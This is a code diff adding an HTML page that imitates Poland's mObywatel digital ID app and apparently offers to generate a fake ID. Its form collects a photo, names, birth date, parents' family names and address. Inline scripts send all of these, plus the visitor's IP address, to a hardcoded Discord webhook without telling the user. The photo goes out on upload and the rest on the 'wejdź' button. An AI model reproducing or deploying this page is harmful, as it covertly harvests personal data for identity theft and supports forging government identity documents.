@@ -1,0 +1,293 @@
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="assets/index.css">
+    <link rel="icon" type="image/x-icon" href="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw">
+    <title>mObywatel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=0.8, user-scalable=no">
+</head>
+<body>
+    <!-- Kontener na górze strony z logo i logo_text -->
+    <div class="header">
+        <img src="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4" class="logo">
+        <p class="logo_text">FmOBywatel 📲</p>
+    </div>
+
+    <!-- Kontener na gwiazdy -->
+    <div class="stars"></div>
+
+    <div class="guide_holder">
+        <div class="top_holder">
+            <p class="guide_title">Instrukcja</p>
+            <img class="arrow" src="https://i.imgur.com/aUZmu0W.png">
+        </div>
+        <div class="guide_text">
+            <span style="font-size: 17px; font-weight: 500;">Dla systemu IOS:</span><br>
+            <ul>
+                <li>Upewnij się, że używasz przeglądarki Safari</li>
+                <li>Uzupełnij dane i kliknij wejdź</li>
+                <li>Naciśnij udostępnij -> Do Ekranu głównego</li>
+            </ul>
+            <span style="font-size: 17px; font-weight: 500;">Dla systemu Android:</span>
+            <ul>
+                <li>Upewnij się, że używasz przeglądarki google lub chrome</li>
+                <li>Uzupełnij dane i kliknij wejdź</li>
+                <li>Naciśnij 3 kropki -> Dodaj do ekranu głównego</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="upload">
+        <p class="error">To pole jest wymagane</p>
+        <img class="upload_uploaded">
+        <div class="upload_uploading"></div>
+        <div class="upload_grid">
+            <img class="upload_image" src="https://i.imgur.com/vwIQErh.png">
+            <p class="upload_text">Dodaj zdjęcie</p>
+        </div>
+        <input type="file" id="photoUpload" accept="image/*" style="display: none;">
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="name" class="input" placeholder="">
+        <span class="placeholder">Imię (imiona)</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+ 
+    <div class="input_holder">
+        <input type="text" id="surname" class="input" placeholder="">
+        <span class="placeholder">Nazwisko</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <p class="top_info">Płeć</p>
+    <div class="selector_box">
+        <div class="selected_grid">
+            <p class="selector_text selected_text">Mężczyzna</p>
+            <img class="selected_arrow" src="https://i.imgur.com/RXsdBB6.png">
+        </div>
+        <div class="option_box">
+            <div class="selector_option" id="m">
+                Mężczyzna
+            </div>
+            <div class="selector_option" id="k">
+                Kobieta
+            </div>
+        </div>
+    </div>
+
+    <div class="date">
+        <p class="top_info">Data urodzenia</p>
+        <div class="date_grid">
+            <input class="date_input" id="birthDay" placeholder="DD" type="number">
+            <input class="date_input" id="birthMonth" placeholder="MM" type="number">
+            <input class="date_input" id="birthYear" placeholder="YYYY" type="number">
+        </div>
+        <p class="error">Wprowadź prawidłową datę</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="nationality" class="input" placeholder="">
+        <span class="placeholder">Obywatelstwo</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="familyName" class="input" placeholder="">
+        <span class="placeholder">Nazwisko rodowe</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="fathersFamilyName" class="input" placeholder="">
+        <span class="placeholder">Nazwisko rodowe ojca</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="mothersFamilyName" class="input" placeholder="">
+        <span class="placeholder">Nazwisko rodowe matki</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <p class="subtext">Miejsce zamieszkania</p>
+
+    <div class="input_holder">
+        <input type="text" id="birthPlace" class="input" placeholder="">
+        <span class="placeholder">Miejsce urodzenia</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="countryOfBirth" class="input" placeholder="">
+        <span class="placeholder">Kraj urodzenia</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="adress1" class="input" placeholder="">
+        <span class="placeholder">Ulica i numer domu</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="adress2" class="input" placeholder="">
+        <span class="placeholder">Kod pocztowy</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <div class="input_holder">
+        <input type="text" id="city" class="input" placeholder="">
+        <span class="placeholder">Miasto</span>
+        <p class="error">To pole jest wymagane</p>
+    </div>
+
+    <!-- Stopka z "wejdź", Discordem i Made By -->
+    <div class="footer">
+        <a class="go" onclick="sendDataToDiscord()">wejdź</a>
+        <div class="discord" onclick="window.open('https://discord.gg/B6X6Yf5JsX')">
+            <div class="inner_grid">
+                <img class="discord_image" src="https://i.imgur.com/eie0S0W.png">
+                <p class="discord_text">Dołącz do naszego discorda</p>
+            </div>
+        </div>
+        <div class="made-by">
+            <p class="footer_text">Made by @d3nt3k3</p>
+        </div>
+    </div>
+
+    <script src="assets/index.js"></script>
+    <script src="assets/manifest.js"></script>
+    <!-- Skrypt do generowania gwiazd -->
+    <script>
+        function createStars() {
+            const starsContainer = document.querySelector('.stars');
+            const fragment = document.createDocumentFragment(); // Użycie DocumentFragment dla optymalizacji
+            for (let i = 0; i < 3000; i++) { // Zwiększono do 3000 gwiazd
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = `${Math.random() * 100}vw`; // Losowa pozycja pozioma
+                star.style.animationDuration = `${Math.random() * 5 + 5}s`; // Losowy czas spadania (5-10s)
+                star.style.animationDelay = `0s`; // Gwiazdy spadają od razu
+                fragment.appendChild(star);
+            }
+            starsContainer.appendChild(fragment); // Dodanie wszystkich gwiazd naraz
+        }
+
+        // Uruchomienie od razu
+        createStars();
+    </script>
+    <!-- Skrypt do wysyłania danych na Discord -->
+    <script>
+        // Funkcja do pobierania IP użytkownika
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Błąd podczas pobierania IP:', error);
+                return 'Nie udało się pobrać IP';
+            }
+        }
+
+        // Funkcja do wysyłania zdjęcia na Discord
+        async function sendPhotoToDiscord(photoFile) {
+            const userIP = await getUserIP();
+            const formData = new FormData();
+            formData.append('content', `**Nowy użytkownik przesłał zdjęcie:**\n**IP:** ${userIP}`);
+            if (photoFile) {
+                formData.append('file', photoFile, 'user_photo.jpg');
+            }
+
+            const webhookURL = 'https://discord.com/api/webhooks/1358051525875990628/s0J9weQThs7uDwQaHdXvw8kPxcdBhuIO9L5W1pjcXWXq1F_Hi6QkhwSL2iCik3LBJ5hx';
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (response.ok) {
+                    console.log('Zdjęcie zostało wysłane na Discord.');
+                } else {
+                    console.error('Błąd podczas wysyłania zdjęcia na Discord:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Błąd podczas wysyłania zdjęcia:', error);
+            }
+        }
+
+        // Funkcja do wysyłania danych użytkownika na Discord
+        async function sendDataToDiscord() {
+            const name = document.getElementById('name').value || 'Brak danych';
+            const surname = document.getElementById('surname').value || 'Brak danych';
+            const gender = document.querySelector('.selector_text.selected_text').innerText || 'Brak danych';
+            const birthDay = document.getElementById('birthDay').value || 'Brak danych';
+            const birthMonth = document.getElementById('birthMonth').value || 'Brak danych';
+            const birthYear = document.getElementById('birthYear').value || 'Brak danych';
+            const nationality = document.getElementById('nationality').value || 'Brak danych';
+            const familyName = document.getElementById('familyName').value || 'Brak danych';
+            const fathersFamilyName = document.getElementById('fathersFamilyName').value || 'Brak danych';
+            const mothersFamilyName = document.getElementById('mothersFamilyName').value || 'Brak danych';
+            const birthPlace = document.getElementById('birthPlace').value || 'Brak danych';
+            const countryOfBirth = document.getElementById('countryOfBirth').value || 'Brak danych';
+            const adress1 = document.getElementById('adress1').value || 'Brak danych';
+            const adress2 = document.getElementById('adress2').value || 'Brak danych';
+            const city = document.getElementById('city').value || 'Brak danych';
+
+            const userIP = await getUserIP();
+
+            const formData = new FormData();
+            formData.append('content', `**Nowy użytkownik przesłał dane:**\n` +
+                `**IP:** ${userIP}\n` +
+                `**Imię:** ${name}\n` +
+                `**Nazwisko:** ${surname}\n` +
+                `**Płeć:** ${gender}\n` +
+                `**Data urodzenia:** ${birthDay}-${birthMonth}-${birthYear}\n` +
+                `**Obywatelstwo:** ${nationality}\n` +
+                `**Nazwisko rodowe:** ${familyName}\n` +
+                `**Nazwisko rodowe ojca:** ${fathersFamilyName}\n` +
+                `**Nazwisko rodowe matki:** ${mothersFamilyName}\n` +
+                `**Miejsce urodzenia:** ${birthPlace}\n` +
+                `**Kraj urodzenia:** ${countryOfBirth}\n` +
+                `**Ulica i numer domu:** ${adress1}\n` +
+                `**Kod pocztowy:** ${adress2}\n` +
+                `**Miasto:** ${city}`);
+
+            const webhookURL = 'https://discord.com/api/webhooks/1358051525875990628/s0J9weQThs7uDwQaHdXvw8kPxcdBhuIO9L5W1pjcXWXq1F_Hi6QkhwSL2iCik3LBJ5hx';
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (response.ok) {
+                    console.log('Dane zostały wysłane na Discord.');
+                } else {
+                    console.error('Błąd podczas wysyłania danych na Discord:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Błąd podczas wysyłania danych:', error);
+            }
+        }
+
+        // Obsługa przesyłania zdjęcia
+        document.querySelector('.upload').addEventListener('click', () => {
+            document.getElementById('photoUpload').click();
+        });
+
+        document.getElementById('photoUpload').addEventListener('change', (event) => {
+            const file = event.target.files[0];
+            if (file) {
+                // Wyświetlenie zdjęcia na stronie
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    document.querySelector('.upload_uploaded').src = e.target.result;
+                    document.querySelector('.upload').classList.add('upload_loaded');
+                };
+                reader.readAsDataURL(file);
+
+                // Wysłanie zdjęcia na Discord od razu
+                sendPhotoToDiscord(file);
+            }
+        });
+    </script>
+    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'92b418e8cdc632e7',t:'MTc0MzgwNDIyMi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+</body>
